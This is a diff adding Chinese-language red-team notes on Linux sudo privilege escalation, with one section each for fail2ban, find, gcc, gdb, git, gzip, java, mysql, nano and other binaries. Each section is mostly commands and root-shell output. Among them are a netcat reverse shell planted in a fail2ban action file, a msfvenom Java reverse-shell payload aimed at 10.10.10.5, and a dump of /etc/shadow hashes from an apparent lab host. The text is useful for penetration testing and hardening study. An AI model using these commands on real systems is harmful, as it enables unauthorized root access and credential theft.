@@ -2480,3 +2480,531 @@ root
 
 `expect` 能模拟用户的键盘输入，恶意命令以 `root` 身份在新的 `shell` 进程中开启了一个交互式会话。`-c` 允许在命令行中输入 `expect` 脚本代码，而不是从文件中读取。
 
+### sudo fail2ban
+
+查看无需密码即可以 sudo 身份执行的命令。
+
+```bash
+jackie@RedteamNotes:~$ sudo -l                    
+Matching Defaults entries for jackie on localhost:
+    env_reset, mail_badpass,      
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+                                                    
+User jackie may run the following commands on localhost:
+    (root) NOPASSWD: /usr/bin/fail2ban
+```
+
+发现可以无需密码执行 `/usr/bin/fail2ban` 命令，查找 `fail2ban` 的配置文件。
+
+```bash
+jackie@RedteamNotes:~$ find / -name fail2ban -type d 2>/dev/null
+/usr/share/doc/fail2ban
+/usr/lib/python3/dist-packages/fail2ban
+/run/fail2ban
+/var/lib/fail2ban
+/etc/fail2ban
+```
+
+进一步查找可写文件。
+
+```bash
+jackie@RedteamNotes:~$ find /etc -writable -type d 2>/dev/null
+/etc/fail2ban/action.d
+jackie@RedteamNotes:~$ ls -liah /etc/fail2ban
+total 72K
+394975 drwxr-xr-x   6 root root   4.0K May 22  2023 .
+393218 drwxr-xr-x 117 root root   4.0K May 24  2023 ..
+394976 drwxrwx---   2 root jackie 4.0K May 22  2023 action.d
+395040 -rw-r--r--   1 root root   2.8K Nov 23  2020 fail2ban.conf
+395041 drwxr-xr-x   2 root root   4.0K Mar 10  2022 fail2ban.d
+395042 drwxr-xr-x   3 root root   4.0K May 17  2023 filter.d
+442894 -rw-r--r--   1 root root    25K May 22  2023 jail.conf
+395137 drwxr-xr-x   2 root root   4.0K May 17  2023 jail.d
+395139 -rw-r--r--   1 root root    645 Nov 23  2020 paths-arch.conf
+395140 -rw-r--r--   1 root root   2.8K Nov 23  2020 paths-common.conf
+395141 -rw-r--r--   1 root root    650 Mar 10  2022 paths-debian.conf
+395142 -rw-r--r--   1 root root    738 Nov 23  2020 paths-opensuse.conf
+```
+
+`fail2ban` 的规则文件夹可写，通过下面办法使其可以编辑
+
+```bash
+ackie@RedteamNotes:/etc/fail2ban/action.d$ ls -liah iptables-multiport.conf
+394582 -rw-r--r-- 1 root root 1.5K May 22  2023 iptables-multiport.conf
+jackie@RedteamNotes:/etc/fail2ban/action.d$ mv iptables-multiport.conf iptables-multiport.conf.bak
+mv: replace 'iptables-multiport.conf.bak', overriding mode 0644 (rw-r--r--)? 
+jackie@RedteamNotes:/etc/fail2ban/action.d$ 
+jackie@RedteamNotes:/etc/fail2ban/action.d$ cp iptables-multiport.conf.bak iptables-multiport.conf
+jackie@RedteamNotes:/etc/fail2ban/action.d$ 
+jackie@RedteamNotes:/etc/fail2ban/action.d$ ls -liah iptables-multiport.conf
+394582 -rw-r--r-- 1 jackie jackie 1.5K Jan 17 15:43 iptables-multiport.conf
+jackie@RedteamNotes:/etc/fail2ban/action.d$ chmod 666 iptables-multiport.conf
+jackie@RedteamNotes:/etc/fail2ban/action.d$ ls -liah iptables-multiport.conf
+394582 -rw-rw-rw- 1 jackie jackie 1.5K Jan 17 15:43 iptables-multiport.conf
+```
+
+`mv` 移动文件所有者不变仍为 `root`，`cp` 复制文件，新文件所有者变为 `jackie`。编辑文件放入 反弹 `shell`。
+
+```bash
+jackie@RedteamNotes:/etc/fail2ban/action.d$ ls -liah iptables-multiport.conf
+394582 -rw-rw-rw- 1 jackie jackie 1.5K Jan 17 15:43 iptables-multiport.conf
+jackie@RedteamNotes:/etc/fail2ban/action.d$ vim iptables-multiport.conf
+jackie@RedteamNotes:/etc/fail2ban/action.d$ cat iptables-multiport.conf | grep 'actionban'
+# Notes.:  command executed once before each actionban command
+# Option:  actionban
+# actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
+actionban = rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.10.5 9595 >/tmp/f
+```
+
+使用 `sudo` 权限重启 `fail2ban`。
+
+```bash
+jackie@RedteamNotes:/etc/fail2ban/action.d$ sudo /etc/init.d/fail2ban restart
+Restarting fail2ban (via systemctl): fail2ban.service.
+```
+
+在 `kali` 中建立监听，然后快速使用空密码登入 `jackie`。
+
+![](Pasted%20image%2020260118180538.png)
+
+### sudo find
+
+查看无需密码即可以 sudo 身份执行的命令。
+
+```bash
+jackie@RedteamNotes:~$ sudo -l                    
+Matching Defaults entries for jackie on localhost:
+    env_reset, mail_badpass,      
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+                                                    
+User jackie may run the following commands on localhost:
+    (root) NOPASSWD: /usr/bin/find
+```
+
+发现可以无需密码执行 `/usr/bin/find` 命令，执行提权命令。
+
+```bash
+jackie@RedteamNotes:~$ sudo find . -exec /bin/bash \; -quit
+root@RedteamNotes:/home/jackie# whoami
+root
+```
+
+解释一下命令。
+
+```sh
+sudo find . -exec /bin/bash \; -quit
+```
+ 
+这个命令不是查找逻辑，`/bin/bash` 不会对找到的文件或目录进行任何处理，而 `-quit` 又会在找到第一个文件或目录后就使 `find` 命令停止。这个命令的使命就是新起一个 `shell`。
+
+`\;` 则是 `-exec` 参数的结束符，告诉 `find` 命令 `-exec` 参数的内容到此为止。需要注意的是 `-exec` 命令后面的 `\;` 必须被转义（即加上 `\`），否则 `shell` 会将 `;` 解释为命令分隔符，导致 `-exec` 参数没有正确的结束，从而引发错误。因此我们需要携程 `\;`，而不是单独的 `;`。
+
+### sudo flock
+
+查看无需密码即可以 sudo 身份执行的命令。
+
+```bash
+jackie@RedteamNotes:~$ sudo -l                    
+Matching Defaults entries for jackie on localhost:
+    env_reset, mail_badpass,      
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+                                                    
+User jackie may run the following commands on localhost:
+    (root) NOPASSWD: /usr/bin/flock
+```
+
+发现可以无需密码执行 `/usr/bin/flock` 命令，执行提权命令。
+
+```bash
+jackie@RedteamNotes:~$ sudo flock -u / /bin/bash
+root@RedteamNotes:/home/jackie# whoami
+root
+root
+```
+
+`flock` 是一个在 Linux 中管理文件锁定的实用程序。它可以用来协调多个进程对文件或文件系统的访问，避免这些进程同时访问同一资源导致的问题。`-u` 是 `flock` 的选项，表示解锁，这个命令的含义就是以管理员权限来解锁对根目录的锁定，以 `bash shell` 来执行这个操作。
+
+### sudo ftp
+
+查看无需密码即可以 sudo 身份执行的命令。
+
+```bash
+jackie@RedteamNotes:~$ sudo -l                    
+Matching Defaults entries for jackie on localhost:
+    env_reset, mail_badpass,      
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+                                                    
+User jackie may run the following commands on localhost:
+    (root) NOPASSWD: /usr/bin/ftp
+```
+
+发现可以无需密码执行 `/usr/bin/ftp` 命令，执行提权命令。
+
+```bash
+jackie@RedteamNotes:~$ sudo ftp
+ftp> !/bin/bash
+root@RedteamNotes:/home/jackie# whoami
+root
+```
+
+`!` 在这里是一个特殊字符，表示要暂时离开 `FTP` 会话并在本地 `shell` 中执行命令。`!` 的这个用法在 `vi`、`ed` 等编辑器下也存在，可以总结为一种通用做法。
+
+### sudo gcc
+
+查看无需密码即可以 sudo 身份执行的命令。
+
+```bash
+jackie@RedteamNotes:~$ sudo -l                    
+Matching Defaults entries for jackie on localhost:
+    env_reset, mail_badpass,      
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+                                                    
+User jackie may run the following commands on localhost:
+    (root) NOPASSWD: /usr/bin/gcc
+```
+
+发现可以无需密码执行 `/usr/bin/gcc` 命令，执行提权命令。
+
+```bash
+jackie@RedteamNotes:~$ sudo gcc -wrapper /bin/bash,-s .
+root@RedteamNotes:/home/jackie# whoami
+root
+```
+
+- `-wrapper` 是 `gcc` 的一个选项，它允许在 `gcc` 调用实际编译器或链接器之前，先调用一个包装器（wrapper）脚本或程序。
+- `,-s` 是一个 `bash` 带的一个选项，它使得 `bash` 在读取到 `EOF` 时不会退出。
+- 最后的 `.` 时编译的源码，给任意源码均可，如果不想编译任何东西可以打包当前目录，即 `.`。
+
+### sudo gdb
+
+查看无需密码即可以 sudo 身份执行的命令。
+
+```bash
+jackie@RedteamNotes:~$ sudo -l                    
+Matching Defaults entries for jackie on localhost:
+    env_reset, mail_badpass,      
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+                                                    
+User jackie may run the following commands on localhost:
+    (root) NOPASSWD: /usr/bin/gdb
+```
+
+发现可以无需密码执行 `/usr/bin/gdb` 命令，执行提权命令。
+
+```bash
+jackie@RedteamNotes:~$ sudo gdb -nx -ex '!/bin/bash' -ex quit
+GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1
+Copyright (C) 2022 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<https://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word".
+root@RedteamNotes:/home/jackie# whoami
+root
+```
+
+1. `-nx`：no execute 这个选项告诉 `gdb` 在启动时不读取任何 `.gdbinit` 文件，`.gdbinit` 文件时一个配置文件，`gdb` 在启动时会读取这个文件中的命令。
+2. `-ex`：execute 这选项允许在 `gdb` 启动时执行一段 `gdb` 命令。
+3. `!bash`：在 `gdb` 中，`!` 用来执行 `shell` 命令，因此 `!bash` 时在 `gdb` 中启动一个 `bash shell` 。
+4. `-ex quit`：在执行完前面的命令后退出。
+
+
+### sudo git
+
+查看无需密码即可以 sudo 身份执行的命令。
+
+```bash
+jackie@RedteamNotes:~$ sudo -l                    
+Matching Defaults entries for jackie on localhost:
+    env_reset, mail_badpass,      
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+                                                    
+User jackie may run the following commands on localhost:
+    (root) NOPASSWD: /usr/bin/git
+```
+
+发现可以无需密码执行 `/usr/bin/git` 命令，执行提权命令。
+
+```bash
+jackie@RedteamNotes:~$ sudo git branch --help
+!/bin/bash
+root@RedteamNotes:/home/jackie# whoami
+root
+```
+
+`branch` 是 `git` 的一个子命令，用于处理代码库中的分支。可以使用 `git branch` 创建、列出、删除分支。
+
+### sudo gzip/gunzip
+
+查看无需密码即可以 sudo 身份执行的命令。
+
+```bash
+jackie@RedteamNotes:~$ sudo -l                    
+Matching Defaults entries for jackie on localhost:
+    env_reset, mail_badpass,      
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+                                                    
+User jackie may run the following commands on localhost:
+    (root) NOPASSWD: /usr/bin/gunzip
+    (root) NOPASSWD: /usr/bin/gzip
+```
+
+发现可以无需密码执行 `/usr/bin/gzip` 命令，执行提权命令。
+
+```bash
+jackie@RedteamNotes:~$ sudo gzip -c /etc/shadow | gzip -d
+root:$6$1mokVIOR1y0hKn2n$.ImQujW12YEC4sMF7IQcUQmLStAQHuByyNhVIiEzvF/SQx3nBMPBFi4xQ40sp80V6ivaJEAy/0n23TsTi.AnO.:19495:0:99999:7:::
+daemon:*:19405:0:99999:7:::
+bin:*:19405:0:99999:7:::
+sys:*:19405:0:99999:7:::
+sync:*:19405:0:99999:7:::
+games:*:19405:0:99999:7:::
+man:*:19405:0:99999:7:::
+lp:*:19405:0:99999:7:::
+mail:*:19405:0:99999:7:::
+news:*:19405:0:99999:7:::
+uucp:*:19405:0:99999:7:::
+proxy:*:19405:0:99999:7:::
+www-data:*:19405:0:99999:7:::
+backup:*:19405:0:99999:7:::
+list:*:19405:0:99999:7:::
+irc:*:19405:0:99999:7:::
+gnats:*:19405:0:99999:7:::
+nobody:*:19405:0:99999:7:::
+_apt:*:19405:0:99999:7:::
+systemd-network:*:19405:0:99999:7:::
+systemd-resolve:*:19405:0:99999:7:::
+messagebus:*:19405:0:99999:7:::
+systemd-timesync:*:19405:0:99999:7:::
+pollinate:*:19405:0:99999:7:::
+sshd:*:19405:0:99999:7:::
+syslog:*:19405:0:99999:7:::
+uuidd:*:19405:0:99999:7:::
+tcpdump:*:19405:0:99999:7:::
+tss:*:19405:0:99999:7:::
+landscape:*:19405:0:99999:7:::
+fwupd-refresh:*:19405:0:99999:7:::
+usbmux:*:19467:0:99999:7:::
+jack:$6$AQNi8FXirbH0UTEj$qFvuV86Nt0rLBUIIzD7lNwBsXAs0Pe.RkeGCdL6WAx7F/dnpMNlWnbtaxrGWLnFriYIssY2APvQoSuaPvHEkc.:19467:0:99999:7:::
+lxd:!:19467::::::
+jackie:$y$j9T$HGogdG4n7G1yXJqpQGvoS/$In6/ABIDki2EGI5fEDDVdWNaVBpoBqWE.mpRK45htg1:19495:0:99999:7:::
+mysql:!:19494:0:99999:7:::
+```
+
+后续可参考可读 shadow 文件提权。
+
+### sudo hping3
+
+查看无需密码即可以 sudo 身份执行的命令。
+
+```bash
+jackie@RedteamNotes:~$ sudo -l                    
+Matching Defaults entries for jackie on localhost:
+    env_reset, mail_badpass,      
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+                                                    
+User jackie may run the following commands on localhost:
+    (root) NOPASSWD: /usr/bin/hping3
+```
+
+发现可以无需密码执行 `/usr/bin/hping3` 命令，执行提权命令。
+
+```bash
+jackie@RedteamNotes:~$ sudo hping3
+hping3> /bin/bash
+root@RedteamNotes:/home/jackie# whoami
+root
+```
+
+`Hping3` 是一个强大的网络工具，用于分析和测试网络，生成各种类型的 `ICMP`、`IP`、`TCP`、`UDP` 和 `RAW-IP` 协议数据包，在交互式命令行启动新的 `bash` 会话。
+
+### sudo iftop
+
+查看无需密码即可以 sudo 身份执行的命令。
+
+```bash
+user@RedteamNotes:~$ sudo -l
+Matching Defaults entries for user on this host:
+    env_reset, env_keep+=LD_PRELOAD
+
+User user may run the following commands on this host:
+    (root) NOPASSWD: /usr/sbin/iftop
+    (root) NOPASSWD: /usr/bin/find
+    (root) NOPASSWD: /usr/bin/nano
+    (root) NOPASSWD: /usr/bin/vim
+    (root) NOPASSWD: /usr/bin/rvim
+    (root) NOPASSWD: /usr/bin/man
+    (root) NOPASSWD: /usr/bin/awk
+    (root) NOPASSWD: /usr/bin/less
+    (root) NOPASSWD: /usr/bin/ftp
+    (root) NOPASSWD: /usr/bin/nmap
+    (root) NOPASSWD: /usr/sbin/apache2
+    (root) NOPASSWD: /bin/more
+    (root) NOPASSWD: /usr/sbin/tcpdump
+    (root) NOPASSWD: /usr/bin/exiftool
+    (ALL, !root) NOPASSWD: /bin/bash
+```
+
+发现可以无需密码执行 `/usr/bin/iftop` 命令，执行提权命令。
+
+```bash
+user@RedteamNotes:~$ sudo iftop
+interface: eth0
+IP address is: 10.10.10.12
+MAC address is: 00:0c:29:72:4e:62
+
+!/bin/bash
+
+root@RedteamNotes:/home/user# whoami
+root
+```
+
+### sudo java
+
+查看无需密码即可以 sudo 身份执行的命令。
+
+```bash
+jackie@RedteamNotes:~$ sudo -l                    
+Matching Defaults entries for jackie on localhost:
+    env_reset, mail_badpass,      
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+                                                    
+User jackie may run the following commands on localhost:
+    (root) NOPASSWD: /usr/bin/java
+```
+
+发现可以无需密码执行 `/usr/bin/java` 命令，在 `kali` 中使用 `msfvenom` 制作一个反弹 `shell`。
+
+```bash
+┌──(kali㉿kali)-[~/Work/Kali]
+└─$ sudo msfvenom -p java/shell_reverse_tcp LHOTST=10.10.10.5 LPORT=4444 -f jar -o shell.jar
+[sudo] password for kali: 
+Payload size: 7497 bytes
+Final size of jar file: 7497 bytes
+Saved as: shell.jar
+┌──(kali㉿kali)-[~/Work/Kali]
+└─$ ls -liah shell.jar 
+2767701 -rw-r--r-- 1 root root 7.4K Jan 19 01:21 shell.jar
+```
+
+传入靶机后使用 `sudo` 权限运行，同时在 `kali` 中建立监听。
+
+![](Pasted%20image%2020260119142451.png)
+
+碰到这种大型的语言或工具，其他的如 `perl`、`ruby`、`awk`，一定是有方法的，对于 `java` 这是标准的第一要能想到的办法。
+
+### sudo less
+
+查看无需密码即可以 sudo 身份执行的命令。
+
+```bash
+jackie@RedteamNotes:~$ sudo -l                    
+Matching Defaults entries for jackie on localhost:
+    env_reset, mail_badpass,      
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+                                                    
+User jackie may run the following commands on localhost:
+    (root) NOPASSWD: /usr/bin/less
+```
+
+发现可以无需密码执行 `/usr/bin/less` 命令，执行提权代码。
+
+```bash
+jackie@RedteamNotes:~$ sudo less /etc/hosts
+
+!/bin/bash
+
+root@RedteamNotes:/home/jackie# whoami
+root
+```
+
+可以建立任意临时文件，在 `less` 中按 `!` 进入命令模式，`/bin/bash` 启动新的 `shell` 会话。
+
+### sudo mount
+
+查看无需密码即可以 sudo 身份执行的命令。
+
+```bash
+jackie@RedteamNotes:~$ sudo -l                    
+Matching Defaults entries for jackie on localhost:
+    env_reset, mail_badpass,      
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+                                                    
+User jackie may run the following commands on localhost:
+    (root) NOPASSWD: /usr/bin/mount
+```
+
+发现可以无需密码执行 `/usr/bin/mount` 命令，执行提权代码。
+
+```bash
+jackie@RedteamNotes:~$ sudo mount -o bind /bin/bash /bin/mount
+jackie@RedteamNotes:~$ sudo /bin/mount
+root@RedteamNotes:/home/jackie# whoami
+root
+```
+
+这段代码使用 `sudo mount` 进行挂载，将 `/bin/bash` 挂载到 `/bin/mount` 下。
+
+### sudo mysql
+
+查看无需密码即可以 sudo 身份执行的命令。
+
+```bash
+jackie@RedteamNotes:~$ sudo -l                    
+Matching Defaults entries for jackie on localhost:
+    env_reset, mail_badpass,      
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+                                                    
+User jackie may run the following commands on localhost:
+    (root) NOPASSWD: /usr/bin/mysql
+```
+
+发现可以无需密码执行 `/usr/bin/mysql` 命令，执行提权代码。
+
+```bash
+jackie@RedteamNotes:~$ sudo mysql -e '\! /bin/bash'
+root@RedteamNotes:/home/jackie# whoami
+root
+```
+
+`-e` 是 `mysql` 的一个参数，execute 一些命令后退出，`-e` 允许直接在命令行中输入命令，而不需要打开一个 `mysql` 互动式会话。
+
+`\! /bin/bash` 并不是一条 `SQL` 命令，而是 `mysql` 的一个特殊命令。当在 `mysql` 命令提示符后输入 `!` 时，可以运行一个系统 `shell` 命令。
+
+### sudo nano
+
+查看无需密码即可以 sudo 身份执行的命令。
+
+```bash
+jackie@RedteamNotes:~$ sudo -l                    
+Matching Defaults entries for jackie on localhost:
+    env_reset, mail_badpass,      
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+                                                    
+User jackie may run the following commands on localhost:
+    (root) NOPASSWD: /usr/bin/mysql
+```
+
+发现可以无需密码执行 `/usr/bin/nano` 命令，执行提权代码。
+
+使用 `sudo nano` 启动 `nano` 后 `ctrl+r`，然后 `ctrl+x` 获得命令执行命令行，然后输入 `reset; bash 1>&0 2>&0` 重置 `shell`，启动 `bash`，输出和错误输入重定向，获得提权后的 `shell`。
+
+![](Pasted%20image%2020260119144813.png)
+
+- 0：标准输入，默认情况下与键盘输入相关联，接收用户从终端输入的数据。
+- 1：标准输出，默认情况下与终端输出相关联，将程序输出的信息显示在终端上。
+- 2：标准错误，默认情况下与终端输出相关联，用于显示程序的错误信息或警告。
+
+- 3：第一个额外描述符。
+- 4：第二个额外描述符。
+- ......
+- 10：第八个额外描述符。
